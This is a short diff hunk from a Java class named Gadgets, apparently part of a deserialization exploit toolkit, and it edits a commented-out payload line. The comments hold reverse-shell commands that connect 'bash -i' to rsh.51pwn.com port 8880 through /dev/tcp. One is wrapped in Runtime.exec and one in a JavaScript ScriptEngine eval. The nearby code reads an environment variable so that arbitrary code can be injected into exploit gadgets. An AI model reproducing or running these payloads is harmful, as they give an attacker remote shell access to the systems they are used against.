@@ -124,7 +124,7 @@ public class Gadgets {
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
             "\");";
         // export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
-        // try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\",\"&\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
+        // try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
         // # 1 env
         String szInjecting = "Custom_Code_51pwn";
         String szEvCmd = System.getenv(szInjecting);
